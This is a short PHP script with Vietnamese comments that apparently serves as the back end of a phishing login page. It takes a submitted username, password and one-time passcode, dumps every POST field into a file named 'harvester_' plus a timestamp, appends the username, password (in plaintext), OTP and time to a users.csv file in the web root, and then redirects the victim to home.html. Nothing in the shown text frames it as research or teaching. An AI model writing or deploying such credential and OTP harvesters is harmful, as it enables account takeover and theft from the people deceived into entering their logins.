<?php
$user = $_POST['username'];
$pass = $_POST['password'];
$otp = $_POST['otp'];
$time = date('Y-m-d H:i:s');

// Thêm vào file log TXT nếu muốn (log lại mọi thao tác)
file_put_contents("harvester_" . date("Ymd_His") . ".txt", print_r($_POST, true), FILE_APPEND);

// Ghi vào users.csv (nếu chưa có tài khoản này)
$csv = '/var/www/html/users.csv';
$exists = false;
if(file_exists($csv)) {
    $lines = file($csv);
    foreach ($lines as $line) {
        $fields = explode(',', trim($line));
        if ($fields[0] === $user) {
            $exists = true;
            break;
        }
    }
}
if (!$exists) {
    // Nếu file chưa có dòng tiêu đề thì thêm
    if(!file_exists($csv) || filesize($csv) === 0) {
        file_put_contents($csv, "username,password,otp,time\n", FILE_APPEND);
    }
    file_put_contents($csv, "$user,$pass,$otp,$time\n", FILE_APPEND);
}

// Chuyển hướng đến trang cảm ơn
header("Location: home.html");
exit;
?>
